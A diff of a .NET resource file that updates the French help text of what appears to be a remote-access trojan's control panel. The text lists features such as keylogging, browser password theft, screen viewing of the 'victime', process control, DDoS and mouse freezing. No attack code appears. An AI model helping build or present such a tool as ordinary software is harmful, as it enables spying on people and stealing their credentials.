@@ -118,32 +118,33 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <data name="label1.Text" xml:space="preserve">
-    <value>FUN TOOLS
+    <value>◈ FUN TOOLS
 
-Ouvrir un pop-up --&gt; Affiche une boîte d'alerte contenant un texte personnalisé.
-Démarrer un processus --&gt; 
-Eteindre un processus :
-Lister les processus :
-Eteindre le PC :
-Freeze le souris :
-Partage d'écran :
+• Ouvrir un pop-up → Affiche une boîte d'alerte contenant un texte personnalisé.
+• Démarrer un processus → Permet de démarrer un processus sur le PC en question.
+• Eteindre un processus → Permet d'éteindre un processus sur le PC en question.
+• Lister les processus → Permet de lister tous les processus actifs sur le PC.
+• Eteindre le PC → Met hors tension l'ordinateur.
+• Freeze le souris → Permet de geler la souris, pour que son utilisation sois stopée.
+• Partage d'écran → Active une vision d'ensemble de l'écran de la victime.
 
-DDOS TOOLS
+◈ DDOS TOOLS
 
-DDOS :
-Récupérer l'IP d'un site :
+• DDOS →
+• Récupérer l'IP d'un site → Permet d'obtenir le numéro d'identification du poste. 
 
-SPY TOOLS 
+◈ SPY TOOLS 
 
-Télécharger les keylogs :
-Récupérer les mots de passe navigateur :
-Upload un ficher :
+• Télécharger les keylogs →
+• Récupérer les mots de passe navigateur →
+• Upload un ficher →
+• Task Managers / CMD / Regedit →
+ 
+◈ OPTIONS
 
-OPTIONS
-
-Retour en arrière :
-Se déconnecter :
-Quitter :</value>
+• Retour en arrière → Retour à la page de séléction des postes.
+• Se déconnecter → Permet de déconnecter sa session du logiciel.
+• Quitter → Quitte définitivement le logiciel.</value>
   </data>
   <assembly alias="System.Drawing" name="System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
   <data name="$this.Icon" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
